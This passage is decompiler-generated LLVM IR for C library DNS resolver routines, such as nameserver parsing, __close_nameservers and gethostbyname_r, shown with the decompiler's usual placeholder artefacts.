  br i1 %v2_1bd48, label %dec_label_pc_1be08.backedge, label %dec_label_pc_1bcec

dec_label_pc_1bd54:                               ; preds = %dec_label_pc_1bca8
  %v0_1bd54 = load i32, i32* @r4, align 4
  store i32 %v0_1bd54, i32* %r0.global-to-local, align 4
  %v2_1bd58 = load i32, i32* %stack_var_-560, align 4
  store i32 %v2_1bd58, i32* @r1, align 4
  %v2_1bd5c = inttoptr i32 %v0_1bd54 to i8*
  %v3_1bd5c = call i32 @__GI_strcoll(i8* %v2_1bd5c, i32 %v2_1bd58)
  store i32 %v3_1bd5c, i32* %r0.global-to-local, align 4
  %sext2 = mul i32 %v3_1bd5c, 16777216
  %v1_1bd60 = sdiv i32 %sext2, 16777216
  store i32 %v1_1bd60, i32* @r4, align 4
  %sext2.off = or i32 %sext2, 16777215
  %tmp70 = icmp ult i32 %sext2.off, 33554431
  br i1 %tmp70, label %dec_label_pc_1bd68, label %dec_label_pc_1be08.backedge

dec_label_pc_1bd68:                               ; preds = %dec_label_pc_1bd54
  %v0_1bd68 = load i32, i32* @r7, align 4
  %v2_1bd68 = icmp eq i32 %v0_1bd68, 0
  br i1 %v2_1bd68, label %dec_label_pc_1be08.backedge, label %dec_label_pc_1bd70

dec_label_pc_1bd70:                               ; preds = %dec_label_pc_1bd68
  store i32 %v0_1bd68, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_1bd78 = call i32 @__GI_strchr(i32 %v0_1bd68, i32 58)
  store i32 %v2_1bd78, i32* %r0.global-to-local, align 4
  store i32 %v2_1bd78, i32* @r6, align 4
  %v3_1bd7c = icmp eq i32 %v2_1bd78, 0
  br i1 %v3_1bd7c, label %dec_label_pc_1be08.backedge, label %dec_label_pc_1bd84

dec_label_pc_1bd84:                               ; preds = %dec_label_pc_1bd70
  store i32 -1248, i32* %r1.global-to-local, align 4
  %v0_1bd88 = load i32, i32* @r4, align 4
  %v1_1bd88 = trunc i32 %v0_1bd88 to i8
  %v3_1bd88 = inttoptr i32 %v2_1bd78 to i8*
  store i8 %v1_1bd88, i8* %v3_1bd88, align 1
  %v0_1bd8c = load i32, i32* @r5, align 4
  %v1_1bd8c = load i32, i32* %r1.global-to-local, align 4
  %v2_1bd8c = add i32 %v1_1bd8c, %v0_1bd8c
  store i32 %v2_1bd8c, i32* @r1, align 4
  %v0_1bd90 = load i32, i32* @r7, align 4
  store i32 %v0_1bd90, i32* %r0.global-to-local, align 4
  %v2_1bd94 = inttoptr i32 %v0_1bd90 to i8*
  %v3_1bd94 = call i32 @__GI_strcoll(i8* %v2_1bd94, i32 %v2_1bd8c)
  store i32 %v3_1bd94, i32* %r0.global-to-local, align 4
  %v2_1bd98 = icmp eq i32 %v3_1bd94, 0
  br i1 %v2_1bd98, label %dec_label_pc_1bdc0, label %dec_label_pc_1bda4

dec_label_pc_1bda4:                               ; preds = %dec_label_pc_1bd84
  %v0_1bda8 = load i32, i32* @r7, align 4
  store i32 %v0_1bda8, i32* %r0.global-to-local, align 4
  %v0_1bdac = load i32, i32* @r5, align 4
  %v2_1bdac = add i32 %v0_1bdac, -1240
  store i32 %v2_1bdac, i32* @r1, align 4
  %v2_1bdb0 = inttoptr i32 %v0_1bda8 to i8*
  %v3_1bdb0 = call i32 @__GI_strcoll(i8* %v2_1bdb0, i32 %v2_1bdac)
  store i32 %v3_1bdb0, i32* %r0.global-to-local, align 4
  %v2_1bdb4 = icmp eq i32 %v3_1bdb0, 0
  br i1 %v2_1bdb4, label %dec_label_pc_1bdc0, label %dec_label_pc_1be08.backedge

dec_label_pc_1bdc0:                               ; preds = %dec_label_pc_1bda4, %dec_label_pc_1bd84
  %storemerge = phi i32 [ 1342, %dec_label_pc_1bd84 ], [ 1343, %dec_label_pc_1bda4 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_1bdc0 = load i32, i32* @r6, align 4
  %v1_1bdc0 = add i32 %v0_1bdc0, 1
  store i32 %v1_1bdc0, i32* @r0, align 4
  %v0_1bdc4 = load i32, i32* @r5, align 4
  %v2_1bdc4 = add i32 %v0_1bdc4, %storemerge
  store i32 %v2_1bdc4, i32* @r4, align 4
  %v1_1bdc8 = call i32 @atol(i32 %v1_1bdc0)
  %v2_1bdc8 = trunc i32 %v1_1bdc8 to i8
  store i32 %v1_1bdc8, i32* %r0.global-to-local, align 4
  %v3_1bdcc = load i32, i32* @r4, align 4
  %v4_1bdcc = inttoptr i32 %v3_1bdcc to i8*
  store i8 %v2_1bdc8, i8* %v4_1bdcc, align 1
  br label %dec_label_pc_1be08.backedge

dec_label_pc_1bdd4:                               ; preds = %dec_label_pc_1bb74
  %v0_1bdd8 = load i32, i32* @r5, align 4
  %v2_1bdd8 = add i32 %v0_1bdd8, -1284
  %v2_1bde4 = add i32 %v0_1bdd8, -1272
  %v2_1bdf0 = add i32 %v0_1bdd8, -1264
  %v2_1bdfc = add i32 %v0_1bdd8, -1256
  store i32 %v2_1bdfc, i32* %r3.global-to-local, align 4
  store i32 27572, i32* @sb, align 4
  store i32 %v2_1bdfc, i32* %stack_var_-560, align 4
  %v2_1be08 = ptrtoint i32* %stack_var_-288 to i32
  %v1_1bbb0 = bitcast i32* %stack_var_-288 to i8*
  %v2_1bbe0 = ptrtoint i16* %stack_var_-68 to i32
  %v2_1bbf4 = bitcast i16* %stack_var_-68 to i8*
  %v2_1bc00 = ptrtoint i32* %stack_var_-60 to i32
  %v2_1bc18 = ptrtoint i32* %stack_var_-64 to i32
  %v2_1bc30 = ptrtoint i32* %stack_var_-304 to i32
  %v14_1bc74 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1be08, i32* @r4, align 4
  store i32 %v2_1be08, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v2_1bb9c, i32* %r2.global-to-local, align 4
  %v3_1be1866 = call i32 @fgets(i32 %v2_1be08, i32 128, i32 %v2_1bb9c)
  store i32 %v3_1be1866, i32* %r0.global-to-local, align 4
  %v2_1be1c68 = icmp eq i32 %v3_1be1866, 0
  br i1 %v2_1be1c68, label %dec_label_pc_1be24, label %dec_label_pc_1bbac

dec_label_pc_1be24:                               ; preds = %dec_label_pc_1be08.backedge, %dec_label_pc_1bdd4
  %v0_1be24 = load i32, i32* @fp, align 4
  store i32 %v0_1be24, i32* %r0.global-to-local, align 4
  %v1_1be28 = inttoptr i32 %v0_1be24 to i16*
  %v2_1be28 = call i32 @__GI_fclose(i16* %v1_1be28)
  store i32 %v2_1be28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1be2c

dec_label_pc_1be2c:                               ; preds = %dec_label_pc_1bb74, %dec_label_pc_1be24
  store i32 27568, i32* %r3.global-to-local, align 4
  %v0_1be30 = load i32, i32* @r5, align 4
  %v2_1be30 = add i32 %v0_1be30, 27568
  %v3_1be30 = inttoptr i32 %v2_1be30 to i32*
  %v4_1be30 = load i32, i32* %v3_1be30, align 4
  store i32 %v4_1be30, i32* %r3.global-to-local, align 4
  %v2_1be34 = icmp eq i32 %v4_1be30, 0
  br i1 %v2_1be34, label %dec_label_pc_1be3c, label %dec_label_pc_1be78

dec_label_pc_1be3c:                               ; preds = %dec_label_pc_1be2c
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_1be40 = call i32 @malloc(i32 28)
  store i32 %v1_1be40, i32* %r0.global-to-local, align 4
  store i32 -1228, i32* %r3.global-to-local, align 4
  store i32 27564, i32* %r2.global-to-local, align 4
  %v2_1be4c = icmp eq i32 %v1_1be40, 0
  %v1_1be50 = load i32, i32* @r5, align 4
  br i1 %v2_1be4c, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_1be3c
  %v3_1be50 = add i32 %v1_1be50, -1228
  store i32 %v3_1be50, i32* %r3.global-to-local, align 4
  %v3_1be5428 = add i32 %v1_1be50, 27564
  %v4_1be5429 = inttoptr i32 %v3_1be5428 to i32*
  store i32 0, i32* %v4_1be5429, align 4
  %v1_1be58 = load i32, i32* %r3.global-to-local, align 4
  %v2_1be58 = load i32, i32* @r5, align 4
  %v3_1be58 = load i32, i32* %r2.global-to-local, align 4
  %v4_1be58 = add i32 %v3_1be58, %v2_1be58
  %v5_1be58 = inttoptr i32 %v4_1be58 to i32*
  store i32 %v1_1be58, i32* %v5_1be58, align 4
  br label %.thread4

bb63:                                             ; preds = %dec_label_pc_1be3c
  %v3_1be54 = add i32 %v1_1be50, 27564
  %v4_1be54 = inttoptr i32 %v3_1be54 to i32*
  store i32 %v1_1be40, i32* %v4_1be54, align 4
  %v1_1be5c = load i32, i32* @r5, align 4
  %v2_1be5c = load i32, i32* %r3.global-to-local, align 4
  %v3_1be5c = add i32 %v2_1be5c, %v1_1be5c
  store i32 %v3_1be5c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %bb62, %bb63
  store i32 114280, i32* @lr, align 4
  %v1_1be64 = xor i1 %v2_1be4c, true
  call void @__pseudo_cond_branch(i1 %v1_1be64, i32 ptrtoint (i32* @global_var_142c0.1247 to i32))
  store i32 27568, i32* %r2.global-to-local, align 4
  %v0_1be6c = load i32, i32* @r5, align 4
  %v2_1be6c = add i32 %v0_1be6c, 27568
  %v3_1be6c = inttoptr i32 %v2_1be6c to i32*
  %v4_1be6c = load i32, i32* %v3_1be6c, align 4
  %v1_1be70 = add i32 %v4_1be6c, 1
  store i32 %v1_1be70, i32* %r3.global-to-local, align 4
  store i32 %v1_1be70, i32* %v3_1be6c, align 4
  %v0_1be7c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1be78

dec_label_pc_1be78:                               ; preds = %dec_label_pc_1be2c, %.thread4
  %v0_1be7c = phi i32 [ %v0_1be30, %dec_label_pc_1be2c ], [ %v0_1be7c.pre, %.thread4 ]
  store i32 27572, i32* @r7, align 4
  %v2_1be7c = add i32 %v0_1be7c, 27572
  %v3_1be7c = inttoptr i32 %v2_1be7c to i32*
  %v4_1be7c = load i32, i32* %v3_1be7c, align 4
  store i32 %v4_1be7c, i32* @r4, align 4
  %v2_1be80 = icmp eq i32 %v4_1be7c, 0
  br i1 %v2_1be80, label %dec_label_pc_1be88, label %dec_label_pc_1bf08

dec_label_pc_1be88:                               ; preds = %dec_label_pc_1be78
  %v2_1be88 = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_1be88, i32* @r6, align 4
  store i32 %v2_1be88, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_1be94 = call i32 @__GI_gethostname(i32 %v2_1be88, i32 255)
  store i32 %v2_1be94, i32* %r0.global-to-local, align 4
  %v2_1be98 = icmp eq i32 %v2_1be94, 0
  br i1 %v2_1be98, label %dec_label_pc_1bea4, label %dec_label_pc_1bf08

dec_label_pc_1bea4:                               ; preds = %dec_label_pc_1be88
  store i32 %v2_1be88, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_1beac = call i32 @__GI_strchr(i32 %v2_1be88, i32 46)
  store i32 %v2_1beac, i32* %r0.global-to-local, align 4
  %v2_1beb0 = icmp eq i32 %v2_1beac, 0
  br i1 %v2_1beb0, label %dec_label_pc_1bf08, label %dec_label_pc_1beb8

dec_label_pc_1beb8:                               ; preds = %dec_label_pc_1bea4
  %v1_1beb8 = add i32 %v2_1beac, 1
  %v2_1beb8 = inttoptr i32 %v1_1beb8 to i8*
  %v3_1beb8 = load i8, i8* %v2_1beb8, align 1
  %v4_1beb8 = zext i8 %v3_1beb8 to i32
  store i32 %v4_1beb8, i32* %r3.global-to-local, align 4
  %v2_1bebc = icmp eq i8 %v3_1beb8, 0
  store i32 %v1_1beb8, i32* %r0.global-to-local, align 4
  br i1 %v2_1bebc, label %dec_label_pc_1bf08, label %dec_label_pc_1bec8

dec_label_pc_1bec8:                               ; preds = %dec_label_pc_1beb8
  %v2_1bec8 = call i32 @__GI_strdup(i8* %v2_1beb8)
  store i32 %v2_1bec8, i32* %r0.global-to-local, align 4
  store i32 %v2_1bec8, i32* @r4, align 4
  %v2_1becc = icmp eq i32 %v2_1bec8, 0
  br i1 %v2_1becc, label %dec_label_pc_1bf08, label %dec_label_pc_1bed4

dec_label_pc_1bed4:                               ; preds = %dec_label_pc_1bec8
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1bed8 = call i32 @malloc(i32 4)
  store i32 %v1_1bed8, i32* %r0.global-to-local, align 4
  store i32 27560, i32* %r3.global-to-local, align 4
  %v2_1bee0 = icmp eq i32 %v1_1bed8, 0
  %v1_1bee4 = load i32, i32* @r5, align 4
  %v3_1bee4 = add i32 %v1_1bee4, 27560
  %v4_1bee4 = inttoptr i32 %v3_1bee4 to i32*
  store i32 %v1_1bed8, i32* %v4_1bee4, align 4
  br i1 %v2_1bee0, label %dec_label_pc_1beec, label %dec_label_pc_1bef8

dec_label_pc_1beec:                               ; preds = %dec_label_pc_1bed4
  %v0_1beec = load i32, i32* @r4, align 4
  store i32 %v0_1beec, i32* @r0, align 4
  %v0_1bef0 = call i32 @free()
  store i32 %v0_1bef0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bf08

dec_label_pc_1bef8:                               ; preds = %dec_label_pc_1bed4
  %v0_1bef8 = load i32, i32* @r5, align 4
  %v1_1bef8 = load i32, i32* @r7, align 4
  %v2_1bef8 = add i32 %v1_1bef8, %v0_1bef8
  %v3_1bef8 = inttoptr i32 %v2_1bef8 to i32*
  %v4_1bef8 = load i32, i32* %v3_1bef8, align 4
  %v1_1befc = add i32 %v4_1bef8, 1
  store i32 %v1_1befc, i32* %r3.global-to-local, align 4
  %v0_1bf00 = load i32, i32* @r4, align 4
  %v2_1bf00 = inttoptr i32 %v1_1bed8 to i32*
  store i32 %v0_1bf00, i32* %v2_1bf00, align 4
  %v0_1bf04 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bf04 = load i32, i32* @r5, align 4
  %v2_1bf04 = load i32, i32* @r7, align 4
  %v3_1bf04 = add i32 %v2_1bf04, %v1_1bf04
  %v4_1bf04 = inttoptr i32 %v3_1bf04 to i32*
  store i32 %v0_1bf04, i32* %v4_1bf04, align 4
  br label %dec_label_pc_1bf08

dec_label_pc_1bf08:                               ; preds = %dec_label_pc_1be88, %dec_label_pc_1be78, %dec_label_pc_1bb64, %dec_label_pc_1bec8, %dec_label_pc_1beb8, %dec_label_pc_1bea4, %dec_label_pc_1beec, %dec_label_pc_1bef8
  store i32 27556, i32* %r3.global-to-local, align 4
  %v0_1bf0c = load i32, i32* @r5, align 4
  %v2_1bf0c = add i32 %v0_1bf0c, 27556
  %v3_1bf0c = inttoptr i32 %v2_1bf0c to i32*
  %v4_1bf0c = load i32, i32* %v3_1bf0c, align 4
  store i32 %v4_1bf0c, i32* %r0.global-to-local, align 4
  %v2_1bf10 = icmp eq i32 %v4_1bf0c, 0
  br i1 %v2_1bf10, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_1bf08
  store i32 114460, i32* %lr.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_1bf08, %bb64
  %v2_1bf18 = xor i1 %v2_1bf10, true
  call void @__pseudo_cond_branch(i1 %v2_1bf18, i32 %v4_1bf0c)
  %v2_1bf20 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1bf20, i32* %r4.global-to-local, align 4
  store i32 %v15_1bb14, i32* @r8, align 4
  store i32 %v18_1bb14, i32* @sb, align 4
  store i32 %v21_1bb14, i32* @sl, align 4
  store i32 %v24_1bb14, i32* @fp, align 4
  store i32 %v27_1bb14, i32* %lr.global-to-local, align 4
  ret i32 %v4_1bf0c

; uselistorder directives
  uselistorder i32 %v4_1bf0c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1be88, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_1bc18, { 1, 0 }
  uselistorder i32 %v2_1bc00, { 1, 0 }
  uselistorder i32 %v2_1bbe0, { 1, 0 }
  uselistorder i32 %v2_1be08, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_1bdd8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1bdc8, { 1, 0 }
  uselistorder i32 %v0_1bd68, { 1, 0, 2 }
  uselistorder i32 %v1_1bce017, { 1, 0 }
  uselistorder i32 %v1_1bcd810, { 1, 0 }
  uselistorder i32 %v0_1bcd89, { 1, 0 }
  uselistorder i32 %v1_1bce0, { 1, 0 }
  uselistorder i32 %v3_1bc5c, { 1, 0, 2, 3, 4 }
  uselistorder i16* %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 13, 23, 0, 14, 15, 16, 1, 19, 17, 18, 20, 21, 22, 24, 25, 26, 27, 28 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 17, 5, 0, 7, 6, 14, 8, 9, 10, 11, 12, 13, 15, 16 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 21, 3, 4, 5, 6, 7, 8, 16, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 5, 4, 6, 8, 7, 10, 9, 12, 11, 56, 55, 13, 15, 14, 17, 16, 18, 20, 19, 22, 21, 23, 24, 26, 25, 27, 29, 28, 34, 33, 49, 48, 30, 31, 32, 36, 35, 38, 37, 39, 41, 40, 42, 44, 43, 45, 47, 46, 52, 50, 51, 54, 53 }
  uselistorder i32 (i16*)* @__GI_fclose, { 4, 3, 0, 1, 2 }
  uselistorder i32 (i32)* @atol, { 20, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 58, { 0, 5, 4, 6, 1, 2, 3, 7 }
  uselistorder i32 (i32*, i32)* @realloc, { 2, 3, 1, 0 }
  uselistorder i16 2, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 26, 28, 29, 3, 30, 25, 4, 5, 24, 31, 12, 22, 23, 41, 40, 27, 0, 13, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 1, 2, 18, 19, 20, 21, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_fopen, { 0, 1, 4, 3, 2 }
  uselistorder i32 -2276, { 1, 0 }
  uselistorder i32 1343, { 0, 3, 4, 2, 1 }
  uselistorder i32 -1304, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1304), { 1, 0 }
  uselistorder i32 27556, { 0, 2, 1, 3 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_1bf08, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_1be78, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1be2c, { 1, 0 }
  uselistorder label %dec_label_pc_1be24, { 1, 0 }
  uselistorder label %dec_label_pc_1bce8, { 1, 0 }
  uselistorder label %dec_label_pc_1be08.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
  uselistorder label %dec_label_pc_1bb64, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1bf70 = load i32, i32* @r4, align 4
  store i32 %v3_1bf70, i32* %stack_var_-20, align 4
  store i32 27564, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r5, align 4
  store i32 -1228, i32* %r3.global-to-local, align 4
  %v4_1bf84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 27564) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1228), i32* %r3.global-to-local, align 4
  store i32 114584, i32* @lr, align 4
  %v1_1bf94 = icmp ne i32 %v4_1bf84, add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1228)
  call void @__pseudo_cond_branch(i1 %v1_1bf94, i32 ptrtoint (i32* @global_var_15e54.996 to i32))
  store i32 27568, i32* %r3.global-to-local, align 4
  store i32 27572, i32* @r7, align 4
  store i32 27560, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1bfa8 = load i32, i32* @r5, align 4
  %v3_1bfa8 = add i32 %v1_1bfa8, 27568
  %v4_1bfa8 = inttoptr i32 %v3_1bfa8 to i32*
  store i32 0, i32* %v4_1bfa8, align 4
  %v0_1bfac = load i32, i32* %r2.global-to-local, align 4
  %v1_1bfac = load i32, i32* @r5, align 4
  %v2_1bfac = load i32, i32* %r4.global-to-local, align 4
  %v3_1bfac = add i32 %v2_1bfac, %v1_1bfac
  %v4_1bfac = inttoptr i32 %v3_1bfac to i32*
  store i32 %v0_1bfac, i32* %v4_1bfac, align 4
  br label %dec_label_pc_1bfc4

dec_label_pc_1bfb4:                               ; preds = %dec_label_pc_1bfc4
  store i32 %v4_1bfd8, i32* %r3.global-to-local, align 4
  store i32 %v1_1bfcc, i32* %v3_1bfc4, align 4
  %v0_1bfbc = load i32, i32* %r3.global-to-local, align 4
  %v1_1bfbc = load i32, i32* %r2.global-to-local, align 4
  %v4_1bfbc = mul i32 %v1_1bfbc, 4
  %v5_1bfbc = add i32 %v4_1bfbc, %v0_1bfbc
  %v6_1bfbc = inttoptr i32 %v5_1bfbc to i32*
  %v7_1bfbc = load i32, i32* %v6_1bfbc, align 4
  store i32 %v7_1bfbc, i32* @r0, align 4
  %v0_1bfc0 = call i32 @free()
  br label %dec_label_pc_1bfc4

dec_label_pc_1bfc4:                               ; preds = %entry, %dec_label_pc_1bfb4
  %v0_1bfc4 = load i32, i32* @r5, align 4
  %v1_1bfc4 = load i32, i32* @r7, align 4
  %v2_1bfc4 = add i32 %v1_1bfc4, %v0_1bfc4
  %v3_1bfc4 = inttoptr i32 %v2_1bfc4 to i32*
  %v4_1bfc4 = load i32, i32* %v3_1bfc4, align 4
  store i32 %v4_1bfc4, i32* @r4, align 4
  %v2_1bfc8 = icmp eq i32 %v4_1bfc4, 0
  %v1_1bfcc = add i32 %v4_1bfc4, -1
  store i32 %v1_1bfcc, i32* %r2.global-to-local, align 4
  %v0_1bfd0 = load i32, i32* @r6, align 4
  store i32 %v0_1bfd0, i32* %r3.global-to-local, align 4
  %v2_1bfd8 = add i32 %v0_1bfd0, %v0_1bfc4
  %v3_1bfd8 = inttoptr i32 %v2_1bfd8 to i32*
  %v4_1bfd8 = load i32, i32* %v3_1bfd8, align 4
  br i1 %v2_1bfc8, label %dec_label_pc_1bfd8, label %dec_label_pc_1bfb4

dec_label_pc_1bfd8:                               ; preds = %dec_label_pc_1bfc4
  store i32 %v4_1bfd8, i32* @r0, align 4
  %v0_1bfdc = call i32 @free()
  %v0_1bfe0 = load i32, i32* @r4, align 4
  %v1_1bfe0 = load i32, i32* @r5, align 4
  %v2_1bfe0 = load i32, i32* @r6, align 4
  %v3_1bfe0 = add i32 %v2_1bfe0, %v1_1bfe0
  %v4_1bfe0 = inttoptr i32 %v3_1bfe0 to i32*
  store i32 %v0_1bfe0, i32* %v4_1bfe0, align 4
  %v2_1bfe8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1bfe8, i32* %r4.global-to-local, align 4
  ret i32 %v0_1bfdc

; uselistorder directives
  uselistorder i32 %v4_1bfd8, { 1, 0 }
  uselistorder i32 %v1_1bfcc, { 1, 0 }
  uselistorder i32* %v3_1bfc4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 27560, { 4, 1, 7, 5, 6, 0, 3, 2, 8 }
  uselistorder i32 27572, { 1, 2, 4, 3, 0 }
  uselistorder i32 27568, { 0, 1, 3, 7, 4, 8, 2, 6, 5, 9, 10, 12, 11, 13 }
  uselistorder i32 -1228, { 1, 2, 0, 3 }
  uselistorder i32 27564, { 4, 5, 1, 0, 7, 2, 6, 3, 8 }
  uselistorder label %dec_label_pc_1bfc4, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v0_1c008 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_1c044 = call i32 @__read_etc_hosts_r()
  store i32 %v0_1c008, i32* @lr, align 4
  ret i32 %v0_1c044
}

define i32 @gethostbyname_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp29, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_1c05c = load i32, i32* @r2, align 4
  store i32 %tmp29, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_1c068 = load i32, i32* @r0, align 4
  store i32 %v0_1c068, i32* @sl, align 4
  %v2_1c068 = icmp eq i32 %v0_1c068, 0
  %v2_1c06c = inttoptr i32 %tmp29 to i32*
  store i32 0, i32* %v2_1c06c, align 4
  %v0_1c070 = load i32, i32* @r1, align 4
  store i32 %v0_1c070, i32* @r7, align 4
  %v0_1c074 = load i32, i32* @r3, align 4
  store i32 %v0_1c074, i32* @r6, align 4
  br i1 %v2_1c068, label %bb, label %dec_label_pc_1c080

bb:                                               ; preds = %entry
  %v1_1c078 = load i32, i32* @r5, align 4
  %v2_1c078 = add i32 %v1_1c078, 22
  store i32 %v2_1c078, i32* @r5, align 4
  br label %dec_label_pc_1c33c

dec_label_pc_1c080:                               ; preds = %entry
  %v0_1c080 = call i32 @__GI___errno_location()
  store i32 %v0_1c080, i32* %r0.global-to-local, align 4
  %v3_1c084 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1c084, i32* %ip.global-to-local, align 4
  %v1_1c088 = inttoptr i32 %v0_1c080 to i32*
  %v2_1c088 = load i32, i32* %v1_1c088, align 4
  store i32 %v2_1c088, i32* @r8, align 4
  %v0_1c08c = load i32, i32* @r5, align 4
  store i32 %v0_1c08c, i32* %v1_1c088, align 4
  %v0_1c090 = load i32, i32* %ip.global-to-local, align 4
  store i32 %tmp18, i32* %ip.global-to-local, align 4
  store i32 %v0_1c080, i32* @r4, align 4
  %v0_1c0a0 = load i32, i32* @sl, align 4
  store i32 %v0_1c0a0, i32* %r0.global-to-local, align 4
  %v0_1c0a4 = load i32, i32* @r7, align 4
  store i32 %v0_1c0a4, i32* %r2.global-to-local, align 4
  store i32 %v0_1c05c, i32* %r3.global-to-local, align 4
  %v0_1c0ac = load i32, i32* @r6, align 4
  %v7_1c0b4 = call i32 @__get_hosts_byname_r(i32 %v0_1c0a0, i32 2, i32 %v0_1c0a4, i32 %v0_1c05c, i32 %v0_1c0ac, i32 %v0_1c090, i32 %tmp18)
  store i32 %v7_1c0b4, i32* %r0.global-to-local, align 4
  store i32 %v7_1c0b4, i32* @r5, align 4
  %v2_1c0b8 = icmp eq i32 %v7_1c0b4, 0
  br i1 %v2_1c0b8, label %bb34, label %dec_label_pc_1c0c4

bb34:                                             ; preds = %dec_label_pc_1c080
  %v1_1c0bc = load i32, i32* @r8, align 4
  %v2_1c0bc = load i32, i32* @r4, align 4
  %v3_1c0bc = inttoptr i32 %v2_1c0bc to i32*
  store i32 %v1_1c0bc, i32* %v3_1c0bc, align 4
  br label %dec_label_pc_1c33c

dec_label_pc_1c0c4:                               ; preds = %dec_label_pc_1c080
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v1_1c0c8 = inttoptr i32 %tmp18 to i32*
  %v2_1c0c8 = load i32, i32* %v1_1c0c8, align 4
  store i32 %v2_1c0c8, i32* %r3.global-to-local, align 4
  %v7_1c0cc = icmp eq i32 %v2_1c0c8, 1
  br i1 %v7_1c0cc, label %dec_label_pc_1c0e8, label %dec_label_pc_1c0d4

dec_label_pc_1c0d4:                               ; preds = %dec_label_pc_1c0c4
  %v7_1c0d4 = icmp eq i32 %v2_1c0c8, 4
  br i1 %v7_1c0d4, label %dec_label_pc_1c108, label %dec_label_pc_1c0dc

dec_label_pc_1c0dc:                               ; preds = %dec_label_pc_1c0d4
  %v3_1c0dc = icmp eq i32 %v2_1c0c8, -1
  br i1 %v3_1c0dc, label %dec_label_pc_1c0fc, label %dec_label_pc_1c33c

dec_label_pc_1c0e8:                               ; preds = %dec_label_pc_1c0c4
  %v7_1c0e8 = icmp eq i32 %v7_1c0b4, 2
  br i1 %v7_1c0e8, label %.thread4, label %bb35

bb35:                                             ; preds = %dec_label_pc_1c0e8
  store i32 0, i32* @r5, align 4
